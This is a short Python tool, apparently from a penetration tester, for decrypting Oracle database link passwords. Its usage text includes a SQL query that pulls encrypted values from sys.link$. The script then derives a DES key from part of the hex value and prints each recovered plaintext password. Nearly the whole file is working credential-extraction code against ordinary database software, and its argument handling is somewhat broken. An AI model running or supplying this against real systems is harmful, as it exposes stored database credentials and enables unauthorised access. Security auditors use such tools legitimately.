__author__ = 'Mustafa'

import sys
from os import getenv
from Crypto.Cipher import DES
from binascii import unhexlify

def usage():
    print ("select userid||':'||passwordx from sys.link$;")
    print ("oraDBLinkPassDecrypter.py <oracle db version 11|12> USERID:PASSWORDX")

if sys.argv[1] and sys.argv[2]:
    if sys.argv[1] <= '11':
        userid = sys.argv[2].split(':')[0]
        hexpass = sys.argv[2].split(':')[1]
    elif sys.argv[1] == '12':
        print ("Missing implementation")
else:
    #check_tnsnames()
    usage()

key = unhexlify(hexpass)[1:9]
encryptedpwd = unhexlify(hexpass)[9:]
IV='\0\0\0\0\0\0\0\0' #Set IV to 0
d=DES.new(key, DES.MODE_CBC, IV)
print ("Decrypted password of %s is %s" % (userid, d.decrypt(encryptedpwd)))